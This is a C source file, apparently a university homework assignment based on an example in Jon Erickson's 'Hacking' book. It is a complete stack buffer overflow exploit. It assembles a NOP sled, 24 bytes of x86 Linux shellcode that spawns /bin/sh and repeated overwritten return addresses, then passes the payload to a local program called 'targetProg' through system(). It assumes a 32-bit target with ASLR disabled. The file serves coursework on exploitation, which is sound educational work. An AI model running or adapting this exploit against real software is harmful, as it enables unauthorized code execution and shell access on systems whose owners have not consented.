/*
   Riad Shash (Ray)
   CSCI 420
   HW#5

   Inspired by the C program in Jon Erickson's "Hacking" book.
   Target Program has to be called "targetProg"

   -Target program has to be 32bit
   -Turn off ASLR

   -Uses the stack in this program as a frame of reference. By subtracting
   an offset from this location, we can determine the right return address
   needed for the target program to execute shellcode located in the
   buffer
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//Shellcode generated with PEDA-gdb for x86 linux exec - 24 bytes
char shellcode[]= 
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
"\xc9\x89\xca\x6a\x0b\x58\xcd\x80";

int main(int argc, char *argv[]) {
   //Varaible i will be used to generate the return address
   unsigned int i, *ptr, ret, offset = 0;
   char *command, *buffer, *nopSled;

   command = (char *) malloc(200);  // allocate 200 bytes in heap for command
   bzero(command, 200); // zero out command memory

   strcpy(command, "./targetProg \'"); // start command buffer build
   buffer = command + strlen(command); // set buffer at the end

   if(argc > 1) // set offset according to provided command line argument (given by bash script)
      offset = atoi(argv[1]);

   ret = (unsigned int) &i - offset; //Make a return address & apply offset
   printf("Using return address: %p\n", ret);

   //Build NOP sled...
   nopSled = (char*) malloc(64);
   bzero(nopSled,64); // zero out memory
   memset(nopSled,0x90,64);
   //strlen() Does not include null character
   printf("Size of NOP sled is: %u\n",(unsigned)strlen(nopSled)); 

   //Add the NOP Sled to buffer...
   memcpy(buffer,nopSled, 64);

   //Add the shell code to buffer...
   memcpy(buffer+64, shellcode, sizeof(shellcode)-1); //-1 to exclude null character
   printf("Size of shellcode is: %u\n",sizeof(shellcode)-1); //-1 to exclude null character

   //Write the same return address until end of controlled buffer overflow...
   for(int i = 88; i < 116; i+=4){
      *((unsigned int *)(buffer+i)) = ret;
   }

   //strlen() Does not include null character
   printf("Size of the buffer is: %u\n",(unsigned)strlen(buffer)); 
   strcat(command, "\'");     //Important - otherwise the command never ends

   system(command); // run target program with buffer overload payload

   //De-allocate used heap
   free(command); 
   free(nopSled);
}